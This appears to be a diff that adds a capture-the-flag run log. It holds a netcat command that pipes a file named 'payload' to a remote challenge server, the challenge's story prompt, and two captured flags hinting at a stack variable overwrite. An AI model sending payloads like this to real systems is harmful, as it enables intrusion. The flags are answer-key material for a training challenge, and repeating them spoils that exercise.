@@ -1,0 +1,7 @@
+$ (nc 140.110.112.77 6125 < payload)
+
+Billy left his key in the locked room.
+However, he forgot the token of the room.
+Do you know what's the key?Door open. OwO
+FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}
+MyFirstCTF{L0c41_vARiaBl3_0n_Th3_sT4cK?!}
